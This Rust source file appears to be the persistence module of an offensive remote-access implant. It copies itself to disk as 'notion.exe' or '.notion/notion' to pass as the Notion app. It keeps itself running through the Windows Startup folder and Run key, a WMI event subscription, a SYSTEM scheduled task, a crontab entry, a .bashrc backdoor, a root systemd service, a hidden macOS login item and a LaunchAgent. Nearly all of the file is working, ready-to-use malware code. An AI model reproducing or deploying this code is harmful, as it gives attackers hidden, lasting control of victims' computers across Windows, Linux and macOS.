use litcrypt::lc;
use std::error::Error;
use std::env::{var, args};
#[cfg(not(windows))] use is_root::is_root;
#[cfg(not(windows))] use crate::cmd::{CommandArgs, shell, save, command_out};
#[cfg(windows)] use crate::cmd::{CommandArgs, command_out};
#[cfg(not(windows))] use std::fs::{create_dir, copy, write};
#[cfg(windows)] use std::path::Path;
#[cfg(windows)] use winreg::{RegKey, enums::*};
#[cfg(windows)] use std::fs::copy as fs_copy;
#[cfg(windows)] use winreg::enums::HKEY_CURRENT_USER;
#[cfg(windows)] use std::process::Command;
#[cfg(windows)] use crate::cmd::getprivs::is_elevated;
use crate::config::ConfigOptions;
use crate::logger::{Logger, log_out};


/// Uses the specified method to establish persistence. 
/// 
/// ### Windows Options
/// 
/// * `startup`: Copies the agent to the Startup Programs folder.
/// * `registry`: Copies the agent to `%LOCALAPPDATA%` and writes a value to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
/// * `wmic`: Establishes persistences via WMI subscriptions.
/// * `schtasks`: Creates a Schedule Task
/// 
/// ### Linux Options
/// 
/// * `cron`: Writes a cronjob to the user's crontab and saves the agent in the home folder
/// * `systemd`: Creates a systemd service and writes the binary someplace special
pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
    // `persist [method] [args]`
    #[cfg(windows)] {
        match cmd_args.nth(0).unwrap().as_str() {
            "startup" => {
                // Get user
                if let Ok(v) = var("APPDATA") {
                    let mut persist_path: String = v;
                    persist_path.push_str(r"\Microsoft\Windows\Start Menu\Programs\Startup\notion.exe");
                    let exe_path = args().nth(0).unwrap();
                    // let mut out_file = File::create(path).expect("Failed to create file");
                    match fs_copy(&exe_path, &persist_path) {
                        Ok(b)  => { return Ok(format!("{b} bytes written to {persist_path}").to_string());},
                        Err(e) => { return Ok(e.to_string())}
                    }
                } else {
                    return command_out!("Couldn't get APPDATA location");
                };
            },
            "registry" => {
                if let Ok(v) = var("LOCALAPPDATA") {
                    let mut persist_path: String = v;
                    persist_path.push_str(r"\notion.exe");
                    let exe_path = args().nth(0).unwrap();
                    logger.debug(log_out!("Current exec path: {exe_path}"));
                    // let mut out_file = File::create(path).expect("Failed to create file");
                    fs_copy(&exe_path, &persist_path)?;
                    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
                    let path = Path::new(r"Software\Microsoft\Windows\CurrentVersion\Run");
                    let (key, disp) = hkcu.create_subkey(&path)?;
                    match disp {
                        RegDisposition::REG_CREATED_NEW_KEY => logger.info(log_out!("A new key has been created")),
                        RegDisposition::REG_OPENED_EXISTING_KEY => logger.info(log_out!("An existing key has been opened")),
                    };
                    key.set_value("Notion", &persist_path)?;
                    command_out!("Persistence accomplished")
                } else {
                    command_out!("LOCALDATA undefined")
                }
            },
            "wmic" => {
                //Ref: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/
                //With special thanks to: https://github.com/trickster0/OffensiveRust
                //OPSEC unsafe! Use with caution
                let elevated = is_elevated();
                if elevated {
                    if let Ok(v) = var("LOCALAPPDATA") {
                        let mut persist_path: String = v;
                        persist_path.push_str(r"\notion.exe");
                        let exe_path = args().nth(0).unwrap();
                        match fs_copy(&exe_path, &persist_path) {
                            Ok(_)  => {
                                
                                let encoded_config = config_options.to_base64();
                                let cmds = vec![
                                    format!(r#"$FilterArgs = @{{ name='Notion';EventNameSpace='root\CimV2';QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"}}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; $ConsumerArgs = @{{ name='Notion';CommandLineTemplate="{persist_path} -b {encoded_config}"; }}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs ; $FilterToConsumerArgs = @{{ Filter = [Ref] $Filter; Consumer = [Ref] $Consumer ;}}; $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs"#),
                                    ];

                                for c in cmds {
                                    Command::new("powershell.exe")
                                    .arg(c)
                                    .spawn()?;
                                };
                                    
                                let sleep_time = 
                                std::time::Duration::from_secs(2);
                                std::thread::sleep(sleep_time);

                                // Checking the subscriptions:
                                let output = Command::new("powershell.exe")
                                    .arg(r"Get-WMIObject -Namespace root\Subscription -Class __EventFilter ")
                                    .output()
                                    .expect("failed to execute process");
                            
                                    let output_string: String;
                                    if output.stderr.len() > 0 {
                                        output_string = String::from_utf8(output.stderr).unwrap();
                                    } else {
                                        output_string = String::from_utf8(output.stdout).unwrap();
                                    }
                                    return Ok(output_string);
                            },
                            Err(e) => { return Ok(e.to_string())}
                        }
                
                    } else {
                        return command_out!("Could not locate APPDATA.");
                    }
                }
                else{
                    return command_out!("[-] WMIC persistence requires admin privileges.");
                }
            },
            "schtasks" => {
                //Ref: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/
                //With special thanks to: https://github.com/trickster0/OffensiveRust
                //OPSEC unsafe! Use with caution
                let elevated = is_elevated();
                if elevated {
                    if let Ok(v) = var("LOCALAPPDATA") {
                        // let cfg_path = format!("{v}\\cfg.json");
                        // let mut cfg_path_args = CommandArgs::from_string(cfg_path.to_owned());
                        // save::handle(&mut cfg_path_args, config_options).await?;
                        let mut persist_path: String = v;
                        persist_path.push_str(r"\notion.exe");
                        
                        let exe_path = args().nth(0).unwrap();
                        match fs_copy(&exe_path, &persist_path) {
                            Ok(_)  => {
                                
                                let encoded_config = config_options.to_base64();
                                // let schtask_arg = format!(r#" /create /tn Notion /tr "C:\Windows\System32\cmd.exe '{persist_path} -b {encoded_config}'" /sc onlogon /ru System""#);
                                let output = Command::new("schtasks.exe")
                                    .arg("/create")
                                    .arg("/tn")
                                    .arg("Notion")
                                    .arg("/tr")
                                    .arg(format!(r#"{persist_path} -b {encoded_config}"#))
                                    .arg("/sc")
                                    .arg("onlogon")
                                    .arg("/ru")
                                    .arg("System")
                                    .output()
                                    .expect("failed to execute process");
                            
                                    let output_string: String;
                                    if output.stderr.len() > 0 {
                                        output_string = String::from_utf8(output.stderr).unwrap();
                                    } else {
                                        output_string = String::from_utf8(output.stdout).unwrap();
                                    }
                                    return Ok(output_string);
                            },
                            Err(e) => { return Ok(e.to_string())}
                        }
                
                    } else {
                        return command_out!("Could not locate APPDATA.");
                    }
                }
                else{
                    return command_out!("[-] Scheduled task persistence requires admin privileges.");
                }
            },



            _ => command_out!("That's not a persistence method!")
        }
    }

    #[cfg(target_os = "linux")] {

        let app_path = args().nth(0).unwrap();
        let home = var("HOME")?;
        let app_dir = format!("{home}/.notion");
        let dest_path = format!("{app_dir}/notion");

        match cmd_args.nth(0).unwrap_or_default().as_str() {
            "cron"    => {
                // Copy the app to a new folder
                match create_dir(&app_dir) {
                    Ok(_) => { logger.info(log_out!("Notion directory created")); },
                    Err(e) => { logger.err(e.to_string()); }
                };
                if let Ok(_) = copy(&app_path, dest_path) {
                    // Save config for relaunch
                    let mut save_args = CommandArgs::from_string(format!("{app_dir}/cfg.json"));
                    save::handle(&mut save_args, config_options).await?;
                    // Write a cronjob to the user's crontab with the given minutes as an interval.
                    let cron_string = format!("0 * * * * {app_dir}/notion");
                    let mut cron_args = CommandArgs::from_string(
                        format!("(crontab -l 2>/dev/null; echo '{cron_string}') | crontab - ")
                    );
                    if let Ok(_) = shell::handle(&mut cron_args).await {
                        command_out!("Cronjob added!")
                    } else {
                        command_out!("Could not make cronjob")
                    }
                } else {
                    command_out!("Could not copy app to destination")
                }
            }
            "bashrc"  => {
                // Copy the app to a new folder
                match create_dir(&app_dir) {
                    Ok(_) => { logger.info(log_out!("Notion directory created")); },
                    Err(e) => { logger.err(e.to_string()); }
                };
                if let Ok(_) = copy(&app_path, dest_path) {
                    // Save config for relaunch
                    let b64_config = config_options.to_base64();
                    // Write a line to the user's bashrc that starts the agent.
                    let mut bashrc_args = CommandArgs::new(
                        vec![format!("echo '{app_dir}/notion -b {b64_config} & disown' >> ~/.bashrc ")]
                    );
                    if let Ok(_) = shell::handle(&mut bashrc_args).await {
                        command_out!("Bash Backdoored!")
                    } else {
                        command_out!("Could not modify bashrc")
                    }
                } else {
                    command_out!("Could not copy app to destination")
                }
            },
            "service" => {
                if is_root() {
                    match create_dir(&app_dir) {
                        Ok(_) => { logger.info(log_out!("Notion directory created")); },
                        Err(e) => { logger.err(e.to_string()); }
                    };    
                    if let Ok(_) = copy(&app_path, &dest_path) {
                        let b64_config = config_options.to_base64();
                        let svc_path = "/lib/systemd/system/notion.service";
                        let svc_string = format!(
"[Unit]
Description=Notion Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart={dest_path} -b {b64_config}

[Install]
WantedBy=multi-user.target"
);
                        write(svc_path, svc_string)?;
                        let mut systemd_args = CommandArgs::from_string(
                            lc!("systemctl enable notion.service")
                        );
                        return shell::handle(&mut systemd_args).await;
                    } else {
                        return command_out!("Could not copy service file");
                    }
                } else {
                    return command_out!("Need to be root first. Try elevate.");
                }
            }, 
            _         => command_out!("Unknown persistence method!")
        }
    }

    #[cfg(target_os = "macos")] {
        let app_path = args().nth(0).unwrap();
        let home = var("HOME")?;
        let app_dir = format!("{home}/.notion");
        let dest_path = format!("{app_dir}/notion");

        match cmd_args.nth(0).unwrap_or_default().as_str() {
            "loginitem" => {
                // Copy the app to a new folder
                match create_dir(&app_dir) {
                    Ok(_) => { logger.info(log_out!("Notion directory created")); },
                    Err(e) => { logger.err(e.to_string()); }
                };
                if let Ok(_) = copy(&app_path, &dest_path) {
                    // Save config for relaunch
                    let b64_config = config_options.to_base64();
                    // Write a line to the user's bashrc that starts the agent.
                    let osascript_string = format!(r#"osascript -e 'tell application "System Events" to make login item at end with properties {{path:"{dest_path}", hidden:true}}'"#);
                    logger.debug(osascript_string.to_owned());
                    let mut applescript_args = CommandArgs::new(
                        vec![osascript_string]
                    );
                    if let Ok(_) = shell::handle(&mut applescript_args).await {
                        command_out!("Login item created!")
                    } else {
                        command_out!("Could not create login item")
                    }
                } else {
                    command_out!("Could not copy app to destination")
                }

            },
            "launchagent" => {
                
                match create_dir(&app_dir) {
                    Ok(_) => { logger.info(log_out!("Notion directory created")); },
                    Err(e) => { logger.err(e.to_string()); }
                };    
                if let Ok(_) = copy(&app_path, &dest_path) {
                    let b64_config = config_options.to_base64();
                    let launch_agent_dir: String;
                    if is_root() {
                        launch_agent_dir = lc!("/Library/LaunchAgents");
                    } else {
                        launch_agent_dir = format!("{home}/Library/LaunchAgents");
                    }
                    let launch_agent_string = format!(
r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.notion.offnote</string>
<key>ProgramArguments</key>
<array>
<string>{dest_path}</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>"#);
                    // Make the user LaunchAgents dir if it doesn't exist
                    
                    if !std::path::Path::new(&launch_agent_dir).is_dir() {
                        create_dir(&launch_agent_dir)?;
                    }
                    write(
                        format!("{launch_agent_dir}/com.notion.offnote.plist").as_str(),
                        &launch_agent_string
                    )?;
                    Ok(format!("LaunchAgent written to {launch_agent_dir}"))
                } else {
                    return command_out!("Could not copy app to destination");
                }
            },
            _ => command_out!("Unknown persistence method!")
        }

    }
}